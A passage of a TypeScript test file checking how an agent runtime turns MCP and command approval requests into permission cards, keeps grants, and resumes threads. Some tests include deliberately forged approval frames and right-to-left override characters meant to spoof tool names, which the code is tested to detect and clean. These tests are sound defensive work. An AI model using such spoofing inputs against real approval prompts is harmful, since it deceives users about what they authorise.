  const aCallEnds = (transport: FakeTransport, id: string, tool = 'note_it'): void =>
    transport.notification('item/completed', {
      threadId: 'th_1',
      turnId: transport.lastTurnId,
      item: {
        type: 'mcpToolCall',
        id,
        server: 'brobot723',
        tool,
        status: 'completed',
        arguments: { note: 'one' },
        appContext: null,
        result: null,
        error: null,
        durationMs: 1,
      },
    })

  const permissionCards = (events: RuntimeEvent[]) =>
    events.filter(
      (e): e is Extract<RuntimeEvent, { type: 'permission_request' }> =>
        e.type === 'permission_request',
    )

  it('🔴 728 review · a server’s form NOBODY answered is told `cancel` — a Stop is not a person’s no; Codex’s own approval keeps `decline`', async () => {
    const answeredWith = async (id: number, frame: Record<string, unknown>, callFirst: boolean) => {
      const { transport, handle, events, consumer } = await startCodexInTurn()
      if (callFirst) aCallStarts(transport, `call_${String(id)}`)
      transport.serverRequest(id, 'mcpServer/elicitation/request', {
        ...frame,
        turnId: transport.lastTurnId,
      })
      await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
      void handle.interrupt().catch(() => {})
      await vi.waitFor(() => expect(transport.responses.some((one) => one.id === id)).toBe(true))
      const sent = transport.responses.find((one) => one.id === id)
      await handle.close()
      await consumer
      return sent
    }
    const serversForm = await answeredWith(
      71,
      { ...ELICITATION, requestedSchema: { type: 'object', properties: {} } },
      false,
    )
    expect(serversForm).toEqual({
      id: 71,
      result: { action: 'cancel', content: null, _meta: null },
    })
    const codexsOwn = await answeredWith(72, CODEX_ASKS, true)
    expect(codexsOwn).toEqual({ id: 72, result: { action: 'decline', content: null, _meta: null } })
  })

  const theServersCard = (events: RuntimeEvent[], id: number): boolean => {
    const card = permissionCards(events).find((one) => one.id === `number:${String(id)}`)
    if (card === undefined) throw new Error(`no card for ${String(id)}`)
    const servers =
      card.mcpToolCall === undefined &&
      card.action === 'brobot723' &&
      card.scope.availableDecisions.join() === 'allow,deny,cancel'
    const codexs =
      card.mcpToolCall !== undefined &&
      card.scope.availableDecisions.join() ===
        'allow,allow_all_for_session,allow_always,deny,cancel'
    if (servers === codexs) throw new Error(`card ${String(id)} is neither shape`)
    return servers
  }

  it('🔴 723 · R80 — Codex’s own approval of an MCP tool call is a CARD naming the server, the tool and the parameters', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    aCallStarts(transport, 'call_1')
    transport.serverRequest(90, 'mcpServer/elicitation/request', CODEX_ASKS)
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const card = firstOfType(events, 'permission_request')
    expect(card.mcpToolCall).toEqual({
      server: 'brobot723',
      tool: 'note_it',
      parameters: [{ name: 'note', value: 'one' }],
    })
    expect(card.kind).toBe('command')
    expect(card.action).toBe('note_it')
    expect(card.detail).toBe('note_it {"note":"one"}')
    expect(card.summary).toBe('Allow the brobot723 MCP server to run tool "note_it"?')
    expect(card.scope.availableDecisions).toEqual([
      'allow',
      'allow_all_for_session',
      'allow_always',
      'deny',
      'cancel',
    ])
    expect(card.scope.persistence).toBe('always')
    expect(card.scope.noPositiveBecause).toBeUndefined()
    expect(card.scope.underDisclosed).toBe(true)
    expect(card.mcpServerAsks).toBeUndefined()
    expect(card.cancelStopsNothing).toBe(true)
    expect(transport.responses).toHaveLength(0)
    await handle.close()
    await consumer
  })

  it('🔴 723 · R80 — Allow once runs the tool: `accept` with no scope, and no grant is kept', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    aCallStarts(transport, 'call_1')
    transport.serverRequest(91, 'mcpServer/elicitation/request', CODEX_ASKS)
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    await handle.respondPermission('number:91', { outcome: 'allow' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    expect(transport.responses[0]).toEqual({
      id: 91,
      result: { action: 'accept', content: {}, _meta: null },
    })
    expect(handle.blanketGrants).toEqual([])
    await handle.close()
    await consumer
  })

  it('🔴 723 · R80 — the conversation’s grant goes back with its scope, and the header can SEE it', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    aCallStarts(transport, 'call_1')
    transport.serverRequest(92, 'mcpServer/elicitation/request', CODEX_ASKS)
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    expect(handle.blanketGrants).toEqual([])
    await handle.respondPermission('number:92', { outcome: 'allow_all_for_session' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    expect(transport.responses[0]).toEqual({
      id: 92,
      result: { action: 'accept', content: {}, _meta: { persist: 'session' } },
    })
    expect(handle.blanketGrants).toEqual(['mcp__brobot723__note_it'])
    await handle.close()
    await consumer
  })

  it('⛔ 723 · R80 — never the NARROW grant: refused before anything goes back', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    aCallStarts(transport, 'call_1')
    transport.serverRequest(93, 'mcpServer/elicitation/request', CODEX_ASKS)
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    await expect(
      handle.respondPermission('number:93', { outcome: 'allow_for_session' }),
    ).rejects.toThrow(/not offered/)
    expect(transport.responses).toHaveLength(0)
    await handle.respondPermission('number:93', { outcome: 'allow_all_for_session' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    await handle.close()
    await consumer
  })

  it('⛔ 723 · R80 — where Codex offers no `session`, the card offers no conversation grant', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    aCallStarts(transport, 'call_1')
    transport.serverRequest(94, 'mcpServer/elicitation/request', {
      ...CODEX_ASKS,
      _meta: { ...CODEX_ASKS._meta, persist: ['always'] },
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const card = firstOfType(events, 'permission_request')
    expect(card.scope.availableDecisions).toEqual(['allow', 'allow_always', 'deny', 'cancel'])
    expect(card.scope.persistence).toBe('always')
    expect(card.scope.grants?.allow_all_for_session).toBeUndefined()
    await expect(
      handle.respondPermission('number:94', { outcome: 'allow_all_for_session' }),
    ).rejects.toThrow(/not offered/)
    expect(transport.responses).toHaveLength(0)
    await handle.close()
    await consumer
  })

  it('🔴 736 · R97 — Deny tells Codex `decline`, and Cancel tells it `cancel` and asks no stop of its own', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.onRequest('turn/interrupt', () => ({}))
    aCallStarts(transport, 'call_a')
    aCallStarts(transport, 'call_b')
    transport.serverRequest(95, 'mcpServer/elicitation/request', CODEX_ASKS)
    transport.serverRequest(96, 'mcpServer/elicitation/request', CODEX_ASKS)
    await vi.waitFor(() => expect(permissionCards(events)).toHaveLength(2))
    await handle.respondPermission('number:95', { outcome: 'deny' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    expect(transport.responses[0]).toEqual({
      id: 95,
      result: { action: 'decline', content: null, _meta: null },
    })
    await new Promise((resolve) => setTimeout(resolve, 20))
    expect(transport.requests.some((one) => one.method === 'turn/interrupt')).toBe(false)
    await handle.respondPermission('number:96', { outcome: 'cancel' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(2))
    expect(transport.responses[1]).toEqual({
      id: 96,
      result: { action: 'cancel', content: null, _meta: null },
    })
    await new Promise((resolve) => setTimeout(resolve, 20))
    expect(transport.requests.some((one) => one.method === 'turn/interrupt')).toBe(false)
    expect(transport.responses).toHaveLength(2)
    await handle.close()
    await consumer
  })

  it('⚑ 723 · R80 CONTROL, 728 re-aimed — a zero-field form that is NOT Codex’s approval is the SERVER’s card, never Codex’s', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    aCallStarts(transport, 'call_1')
    transport.serverRequest(97, 'mcpServer/elicitation/request', {
      ...CODEX_ASKS,
      _meta: { ...CODEX_ASKS._meta, codex_approval_kind: 'something_else' },
    })
    transport.serverRequest(98, 'mcpServer/elicitation/request', { ...CODEX_ASKS, _meta: null })
    await vi.waitFor(() => expect(permissionCards(events)).toHaveLength(2))
    for (const id of [97, 98]) expect(theServersCard(events, id), String(id)).toBe(true)
    expect(events.some((e) => e.type === 'user_input_request')).toBe(false)
    expect(transport.responses).toHaveLength(0)
    await handle.close()
    await consumer
  })

  it('⚑ 723 · R80 CONTROL — a frame marked as Codex’s approval that ASKS something is a question, never an Allow of `{}`', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    aCallStarts(transport, 'call_1')
    transport.serverRequest(106, 'mcpServer/elicitation/request', {
      ...CODEX_ASKS,
      requestedSchema: ELICITATION.requestedSchema,
    })
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    expect(events.some((e) => e.type === 'permission_request')).toBe(false)
    await handle.close()
    await consumer
  })

  it('⚑ 723 · R80 CONTROL — a `url` frame wearing the marker is the server’s card, never Codex’s approval', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    aCallStarts(transport, 'call_1')
    transport.serverRequest(107, 'mcpServer/elicitation/request', {
      serverName: 'brobot723',
      mode: 'url',
      _meta: CODEX_ASKS._meta,
      message: CODEX_ASKS.message,
      url: 'https://example.invalid/consent',
      elicitationId: 'e723',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const card = firstOfType(events, 'permission_request')
    expect(card.mcpToolCall).toBeUndefined()
    expect(card.mcpServerAsks).toEqual({
      server: 'brobot723',
      url: 'https://example.invalid/consent',
    })
    expect(card.scope.availableDecisions).toEqual(['allow', 'deny', 'cancel'])
    await handle.close()
    await consumer
  })

  it('🔴 723 · R80 — a SECOND frame wearing the marker for a call Codex already asked about is the server’s card (728: shown, never Codex’s)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    aCallStarts(transport, 'call_1')
    transport.serverRequest(110, 'mcpServer/elicitation/request', CODEX_ASKS)
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    await handle.respondPermission('number:110', { outcome: 'allow' })
    transport.serverRequest(111, 'mcpServer/elicitation/request', {
      ...CODEX_ASKS,
      message: 'Allow the brobot723 MCP server to run tool "note_it"?',
      _meta: { ...CODEX_ASKS._meta, tool_params: { note: 'drop everything' } },
    })
    await vi.waitFor(() => expect(permissionCards(events)).toHaveLength(2))
    expect(theServersCard(events, 111)).toBe(true)
    expect(transport.responses.map((one) => one.id)).toEqual([110])
    await handle.close()
    await consumer
  })

  it('🔴 723 · R80 — a frame wearing the marker that names a tool NO running call is running is the server’s', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    aCallStarts(transport, 'call_1')
    transport.serverRequest(112, 'mcpServer/elicitation/request', {
      ...CODEX_ASKS,
      message: 'Allow the brobot723 MCP server to run tool "delete_everything"?',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    expect(theServersCard(events, 112)).toBe(true)
    transport.serverRequest(113, 'mcpServer/elicitation/request', CODEX_ASKS)
    await vi.waitFor(() => expect(permissionCards(events)).toHaveLength(2))
    expect(theServersCard(events, 113)).toBe(false)
    await handle.close()
    await consumer
  })

  it('⚑ 723 · R80 RAIL — a frame wearing the marker with NO call running is the server’s card (`723`’s main declined every such frame; M11 makes it red)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    aCallStarts(transport, 'call_1')
    aCallEnds(transport, 'call_1')
    transport.serverRequest(114, 'mcpServer/elicitation/request', CODEX_ASKS)
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    expect(theServersCard(events, 114)).toBe(true)
    await handle.close()
    await consumer
  })

  it('🔴 723 · R80 — a tool granted for the conversation is not asked about again, so a frame for it is the server’s', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    aCallStarts(transport, 'call_1')
    transport.serverRequest(115, 'mcpServer/elicitation/request', CODEX_ASKS)
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    await handle.respondPermission('number:115', { outcome: 'allow_all_for_session' })
    aCallEnds(transport, 'call_1')
    aCallStarts(transport, 'call_2')
    transport.serverRequest(116, 'mcpServer/elicitation/request', CODEX_ASKS)
    await vi.waitFor(() => expect(permissionCards(events)).toHaveLength(2))
    expect(theServersCard(events, 116)).toBe(true)
    aCallStarts(transport, 'call_3', 'note_that')
    transport.serverRequest(117, 'mcpServer/elicitation/request', {
      ...CODEX_ASKS,
      message: 'Allow the brobot723 MCP server to run tool "note_that"?',
    })
    await vi.waitFor(() => expect(permissionCards(events)).toHaveLength(3))
    expect(theServersCard(events, 117)).toBe(false)
    await handle.close()
    await consumer
  })

  it('⚑ 723 · R80 RAIL — a frame wearing the marker that names NO turn is never Codex’s approval: the server’s card (`060`: nothing authorized under an unconfirmed turn; M7 makes it red)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    aCallStarts(transport, 'call_1')
    transport.serverRequest(118, 'mcpServer/elicitation/request', { ...CODEX_ASKS, turnId: null })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    expect(theServersCard(events, 118)).toBe(true)
    expect(firstOfType(events, 'permission_request').cancelStopsNothing).toBe(true)
    await handle.close()
    await consumer
  })

  it('🔴 723 · R80 — a question Codex did not word as measured is tied to its server’s ONE waiting call — and to none of two', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    aCallStarts(transport, 'call_1')
    transport.serverRequest(99, 'mcpServer/elicitation/request', {
      ...CODEX_ASKS,
      message: 'Approve app tool call?',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const card = firstOfType(events, 'permission_request')
    expect(card.mcpToolCall).toEqual({
      server: 'brobot723',
      tool: 'note_it',
      parameters: [{ name: 'note', value: 'one' }],
    })
    expect(card.action).toBe('note_it')
    expect(card.detail).toBe('note_it {"note":"one"}')
    aCallStarts(transport, 'call_2', 'note_that')
    aCallStarts(transport, 'call_3', 'look_it_up')
    transport.serverRequest(100, 'mcpServer/elicitation/request', {
      ...CODEX_ASKS,
      message: 'Approve app tool call?',
    })
    await vi.waitFor(() => expect(permissionCards(events)).toHaveLength(2))
    expect(theServersCard(events, 100)).toBe(true)
    await handle.close()
    await consumer
  })

  it('🔴 723 · R80 — every string a server chose is cleaned where it is drawn: the tool, the parameter names and values, the question', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    aCallStarts(transport, 'call_1', 'note\u202Eit')
    transport.serverRequest(101, 'mcpServer/elicitation/request', {
      ...CODEX_ASKS,
      message: 'Allow the brobot723 MCP server to run tool "note\u202Eit"?',
      _meta: {
        ...CODEX_ASKS._meta,
        tool_params: { query: 'a\u202Eb', limit: 5, tags: ['x'] },
        tool_params_display: [
          { name: 'query', value: 'a\u202Eb', display_name: 'Search\u202E for' },
          { name: 'limit', value: 5, display_name: 'limit' },
          { name: 'tags', value: ['x'] },
        ],
      },
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const card = firstOfType(events, 'permission_request')
    expect(card.mcpToolCall?.tool).toBe('noteit')
    expect(card.action).toBe('noteit')
    expect(card.mcpToolCall?.parameters).toEqual([
      { name: 'Search for', value: 'ab' },
      { name: 'limit', value: '5' },
      { name: 'tags', value: '["x"]' },
    ])
    expect(card.summary).toBe('Allow the brobot723 MCP server to run tool "noteit"?')
    await handle.close()
    await consumer
  })

  it('🔴 723 · R80 — a parameter this app cannot show WHOLE ends the list there, and the cut is COUNTED — never drawn empty', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    const past = 'x'.repeat(70 * 1024)
    const long = 'y'.repeat(40 * 1024)
    aCallStarts(transport, 'call_1')
    aCallStarts(transport, 'call_2', 'note_that')
    transport.serverRequest(102, 'mcpServer/elicitation/request', {
      ...CODEX_ASKS,
      _meta: {
        ...CODEX_ASKS._meta,
        tool_params_display: [
          { name: 'path', value: 'deploy.sh' },
          { name: 'content', value: past },
          { name: 'mode', value: 'w' },
        ],
      },
    })
    transport.serverRequest(103, 'mcpServer/elicitation/request', {
      ...CODEX_ASKS,
      message: 'Allow the brobot723 MCP server to run tool "note_that"?',
      _meta: {
        ...CODEX_ASKS._meta,
        tool_params_display: [
          { name: 'a', value: long },
          { name: 'b', value: long },
          { name: 'c', value: 'short' },
        ],
      },
    })
    await vi.waitFor(() => expect(permissionCards(events)).toHaveLength(2))
    const [one, two] = permissionCards(events)
    expect(one?.mcpToolCall?.parameters).toEqual([{ name: 'path', value: 'deploy.sh' }])
    expect(one?.mcpToolCall?.parametersOmitted).toBe(2)
    expect(two?.mcpToolCall?.parameters).toEqual([{ name: 'a', value: long }])
    expect(two?.mcpToolCall?.parametersOmitted).toBe(2)
    await handle.close()
    await consumer
  })

  it('🔴 723 · R81 — a frame that named NO turn raises a card MARKED: its Cancel stops nothing', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(104, 'mcpServer/elicitation/request', {
      turnId: null,
      serverName: 'kibana',
      mode: 'url',
      _meta: null,
      message: 'Sign in here first.',
      url: 'https://example.invalid/auth',
      elicitationId: 'e1',
    })
    await vi.waitFor(() => expect(permissionCards(events)).toHaveLength(1))
    expect(permissionCards(events)[0]?.cancelStopsNothing).toBe(true)
    await handle.respondPermission('number:104', { outcome: 'cancel' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    await new Promise((resolve) => setTimeout(resolve, 20))
    expect(transport.requests.some((one) => one.method === 'turn/interrupt')).toBe(false)
    await handle.close()
    await consumer
  })

  it('🔴 736 · R97 — a frame that named its turn is marked too, on either card; a command approval is not', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(105, 'mcpServer/elicitation/request', {
      serverName: 'kibana',
      mode: 'url',
      _meta: null,
      message: 'Sign in here first.',
      url: 'https://example.invalid/auth',
      elicitationId: 'e1',
    })
    aCallStarts(transport, 'call_1')
    transport.serverRequest(108, 'mcpServer/elicitation/request', CODEX_ASKS)
    await vi.waitFor(() => expect(permissionCards(events)).toHaveLength(2))
    expect(permissionCards(events).map((card) => card.mcpToolCall === undefined)).toEqual([
      true,
      false,
    ])
    for (const card of permissionCards(events)) expect(card.cancelStopsNothing).toBe(true)
    transport.serverRequest(109, 'item/commandExecution/requestApproval', { command: 'x' })
    await vi.waitFor(() => expect(permissionCards(events)).toHaveLength(3))
    expect(permissionCards(events)[2]?.cancelStopsNothing).toBeUndefined()
    await handle.close()
    await consumer
  })

  const homes: string[] = []
  afterEach(() => {
    for (const home of homes.splice(0)) rmSync(home, { recursive: true, force: true })
  })
  const aHome = (): string => {
    const home = mkdtempSync(join(tmpdir(), 'brobot2-736-'))
    homes.push(home)
    return home
  }
  const KEPT = 'brobot-kept-tool-approvals.json'
  const BROBOT723 = {
    servers: [{ name: 'brobot723', url: 'http://127.0.0.1:7723/mcp' }],
    reservedToolNames: ['spawn_agent'],
  }

  async function inTurnIn(home: string): Promise<{
    transport: FakeTransport
    handle: Awaited<ReturnType<CodexRuntime['start']>>
    events: RuntimeEvent[]
    consumer: Promise<void>
  }> {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => okThread('th_1'))
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: home,
      externalMcp: BROBOT723,
    })
    const events: RuntimeEvent[] = []
    const consumer = collect(handle, events)
    await handle.send('go')
    await vi.waitFor(() =>
      expect(events.filter((e) => e.type === 'status').at(-1)?.state).toBe('working'),
    )
    return { transport, handle, events, consumer }
  }

  it('🔴 736 · R95 — Codex’s MCP approval offering `always` has Always allow: `persist: always`, kept in the home first', async () => {
    const home = aHome()
    const file = join(home, KEPT)
    const { transport, handle, events, consumer } = await inTurnIn(home)
    aCallStarts(transport, 'call_1')
    transport.serverRequest(120, 'mcpServer/elicitation/request', CODEX_ASKS)
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const card = firstOfType(events, 'permission_request')
    expect(card.scope.availableDecisions).toEqual([
      'allow',
      'allow_all_for_session',
      'allow_always',
      'deny',
      'cancel',
    ])
    expect(card.scope.persistence).toBe('always')
    const rule = { kind: 'tool', tool: 'note_it', server: 'brobot723' }
    expect(card.scope.grants).toEqual({
      allow_all_for_session: [rule],
      allow_always: [rule],
      alwaysFile: file,
    })
    let keptWhenAnswered: boolean | null = null
    const respond = transport.respond.bind(transport)
    transport.respond = (id, result) => {
      keptWhenAnswered = existsSync(file)
      respond(id, result)
    }
    await handle.respondPermission('number:120', { outcome: 'allow_always' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    expect(transport.responses[0]).toEqual({
      id: 120,
      result: { action: 'accept', content: {}, _meta: { persist: 'always' } },
    })
    expect(keptWhenAnswered).toBe(true)
    expect(JSON.parse(readFileSync(file, 'utf8'))).toEqual({
      always: [{ server: 'brobot723', url: 'http://127.0.0.1:7723/mcp', tool: 'note_it' }],
    })
    expect(handle.blanketGrants).toEqual(['mcp__brobot723__note_it'])
    await handle.close()
    await consumer
    const next = new FakeTransport()
    next.onRequest('thread/start', () => okThread('th_2'))
    const again = await new CodexRuntime(adopt(next)).start({
      cwd: '/tmp/x',
      providerHome: home,
      externalMcp: BROBOT723,
    })
    expect(
      (next.requests.find((one) => one.method === 'thread/start')?.params as { config?: unknown })
        .config,
    ).toEqual({
      ...EVERY_THREAD_OVERLAY,
      mcp_servers: {
        brobot723: {
          url: 'http://127.0.0.1:7723/mcp',
          tools: { note_it: { approval_mode: 'approve' } },
        },
      },
    })
    await again.close()
  })

  it('⚑ 736 · R95 CONTROL — where Codex offers only `session`, no Always allow: refused, nothing kept, nothing sent', async () => {
    const home = aHome()
    const { transport, handle, events, consumer } = await inTurnIn(home)
    aCallStarts(transport, 'call_1')
    transport.serverRequest(121, 'mcpServer/elicitation/request', {
      ...CODEX_ASKS,
      _meta: { ...CODEX_ASKS._meta, persist: ['session'] },
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const card = firstOfType(events, 'permission_request')
    expect(card.scope.availableDecisions).toEqual([
      'allow',
      'allow_all_for_session',
      'deny',
      'cancel',
    ])
    expect(card.scope.persistence).toBe('session')
    expect(card.scope.grants?.allow_always).toBeUndefined()
    expect(card.scope.grants?.alwaysFile).toBeUndefined()
    await expect(
      handle.respondPermission('number:121', { outcome: 'allow_always' }),
    ).rejects.toThrow(/not offered/)
    expect(transport.responses).toHaveLength(0)
    expect(existsSync(join(home, KEPT))).toBe(false)
    await handle.close()
    await consumer
  })

  it('⛔ 736 · R95 — an Always allow that cannot be KEPT is refused `not-kept`: nothing sent, and the card stays live', async () => {
    const home = aHome()
    mkdirSync(join(home, KEPT))
    const { transport, handle, events, consumer } = await inTurnIn(home)
    aCallStarts(transport, 'call_1')
    transport.serverRequest(122, 'mcpServer/elicitation/request', CODEX_ASKS)
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const refused = await handle.respondPermission('number:122', { outcome: 'allow_always' }).then(
      () => null,
      (error: unknown) => error,
    )
    expect((refused as { refusal?: unknown } | null)?.refusal).toBe('not-kept')
    expect((refused as Error).message).toMatch(/could not keep/)
    expect(transport.responses).toHaveLength(0)
    expect(handle.blanketGrants).toEqual([])
    await handle.respondPermission('number:122', { outcome: 'allow' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    expect(transport.responses[0]).toEqual({
      id: 122,
      result: { action: 'accept', content: {}, _meta: null },
    })
    await handle.close()
    await consumer
  })

  it('🔴 736 · R95 — a kept approval is declared in its server’s OWN table at every launch; a server with none stays `{ url }`', async () => {
    const home = aHome()
    writeFileSync(
      join(home, KEPT),
      `${JSON.stringify({
        always: [
          { server: 'kibana', url: 'http://127.0.0.1:7001/mcp', tool: 'search' },
          { server: 'not_declared', url: 'http://127.0.0.1:7009/mcp', tool: 'x' },
          { server: 'grafana', url: 'http://127.0.0.1:7999/mcp', tool: 'dashboards' },
        ],
      })}\n`,
    )
    const TWO = {
      servers: [
        { name: 'kibana', url: 'http://127.0.0.1:7001/mcp' },
        { name: 'grafana', url: 'http://127.0.0.1:7002/mcp' },
      ],
      reservedToolNames: ['spawn_agent'],
    }
    const expected = {
      ...EVERY_THREAD_OVERLAY,
      mcp_servers: {
        kibana: {
          url: 'http://127.0.0.1:7001/mcp',
          tools: { search: { approval_mode: 'approve' } },
        },
        grafana: { url: 'http://127.0.0.1:7002/mcp' },
      },
    }
    const started = new FakeTransport()
    started.onRequest('thread/start', () => okThread('th_1'))
    const one = await new CodexRuntime(adopt(started)).start({
      cwd: '/tmp/x',
      providerHome: home,
      externalMcp: TWO,
    })
    expect(
      (started.requests.find((r) => r.method === 'thread/start')?.params as { config?: unknown })
        .config,
    ).toEqual(expected)
    expect(one.blanketGrants).toEqual(['mcp__kibana__search'])
    await one.close()
    const resumed = new FakeTransport()
    resumed.onRequest('thread/resume', () => okThread('th_1'))
    const two = await new CodexRuntime(adopt(resumed)).resume(
      { provider: 'codex', sessionId: 'th_1', cwd: '/tmp/x', rotation: 1 },
      { providerHome: home, externalMcp: TWO },
    )
    expect(
      (resumed.requests.find((r) => r.method === 'thread/resume')?.params as { config?: unknown })
        .config,
    ).toEqual(expected)
    await two.close()
  })

  it('🔴 736 · R95 — a command approval offering the prefix-rule amendment has Always allow, and sends the offered decision verbatim', async () => {
    const OFFERED = {
      acceptWithExecpolicyAmendment: { execpolicy_amendment: ['/usr/bin/touch', 'x'] },
    }
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(123, 'item/commandExecution/requestApproval', {
      command: '/usr/bin/touch x',
      cwd: '/tmp/x',
      proposedExecpolicyAmendment: ['/usr/bin/touch', 'x'],
      availableDecisions: ['accept', OFFERED, 'cancel'],
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const card = firstOfType(events, 'permission_request')
    expect(card.scope.availableDecisions).toEqual(['allow', 'allow_always', 'deny', 'cancel'])
    expect(card.scope.persistence).toBe('always')
    expect(card.scope.grants).toEqual({
      allow_always: [{ kind: 'command-prefix', prefix: ['/usr/bin/touch', 'x'] }],
      alwaysFile: join('/tmp/x/home', 'rules', 'default.rules'),
    })
    await handle.respondPermission('number:123', { outcome: 'allow_always' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    expect(transport.responses[0]).toEqual({ id: 123, result: { decision: OFFERED } })
    await handle.close()
    await consumer
  })

  it('⚑ 736 · R95 CONTROL — a command approval with NO amendment offered has no Always allow, and refuses one', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(124, 'item/commandExecution/requestApproval', {
      command: '/usr/bin/touch x',
      cwd: '/tmp/x',
      proposedExecpolicyAmendment: ['/usr/bin/touch', 'x'],
      availableDecisions: ['accept', 'cancel'],
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const card = firstOfType(events, 'permission_request')
    expect(card.scope.availableDecisions).toEqual(['allow', 'deny', 'cancel'])
    expect(card.scope.persistence).toBe('once')
    expect(card.scope.grants).toBeUndefined()
    await expect(
      handle.respondPermission('number:124', { outcome: 'allow_always' }),
    ).rejects.toThrow(/not offered/)
    expect(transport.responses).toHaveLength(0)
    await handle.close()
    await consumer
  })

  it('close() safe-rejects a pending approval (app-server gets decline)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(80, 'item/commandExecution/requestApproval', { command: 'x' })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    await handle.close()
    await consumer
    expect(
      transport.responses.some(
        (r) => r.id === 80 && (r.result as { decision: string }).decision === 'decline',
      ),
    ).toBe(true)
  })

  it('respondPermission on an unknown id throws', async () => {
    const { handle, consumer } = await startCodex()
    await expect(handle.respondPermission('nope', { outcome: 'allow' })).rejects.toThrow()
    await handle.close()
    await consumer
  })
})

describe('CodexRuntime — honest resume', () => {
  it('resume → thread/resume; a MATCHING response emits session resumed and exposes the ref', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/resume', () => okThread('th_x'))
    const runtime = new CodexRuntime(adopt(transport))
    const handle = await runtime.resume(
      { provider: 'codex', sessionId: 'th_x', cwd: '/tmp/x', rotation: 3 },
      { providerHome: '/tmp/x/home' },
    )
    expect(handle.ref).not.toBeNull()
    expect(handle.ref?.sessionId).toBe('th_x')
    const events: RuntimeEvent[] = []
    const consumer = collect(handle, events)
    await vi.waitFor(has(events, (e) => e.type === 'session'))
    expect(firstOfType(events, 'session').state).toBe('resumed')
    await handle.close()
    await consumer
  })

  it('resume of a missing thread → ResumeError (no silent fresh thread)', async () => {
    const transport = new FakeTransport()
    transport.failRequest('thread/resume')
    const runtime = new CodexRuntime(adopt(transport))
    const resuming = runtime.resume(
      { provider: 'codex', sessionId: 'gone', cwd: '/tmp/x', rotation: 0 },
      { providerHome: '/tmp/x/home' },
    )
    await expect(resuming).rejects.toBeInstanceOf(ResumeError)
    const lost = await resuming.catch((error: unknown) => error)
    expect((lost as Error).cause).toMatchObject({ message: 'transport: thread/resume failed' })
    expect((lost as ResumeError).noSuchSession).toBe(false)
  })

  it('resume: malformed thread/resume ({}) → ResumeError, does not echo the requested id', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/resume', () => malformedThreadStartResponse)
    const runtime = new CodexRuntime(adopt(transport))
    await expect(
      runtime.resume(
        { provider: 'codex', sessionId: 'th_x', cwd: '/tmp/x', rotation: 0 },
        { providerHome: '/tmp/x/home' },
      ),
    ).rejects.toBeInstanceOf(ResumeError)
  })

  it('resume: returned thread.id differs from requested → ResumeError', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/resume', () => threadStartResponse('th_OTHER', '/tmp/x'))
    const runtime = new CodexRuntime(adopt(transport))
    await expect(
      runtime.resume(
        { provider: 'codex', sessionId: 'th_x', cwd: '/tmp/x', rotation: 0 },
        { providerHome: '/tmp/x/home' },
      ),
    ).rejects.toBeInstanceOf(ResumeError)
  })

  it('resume: returned cwd differs from requested → ResumeError', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/resume', () => threadStartResponse('th_x', '/tmp/OTHER'))
    const runtime = new CodexRuntime(adopt(transport))
    await expect(
      runtime.resume(
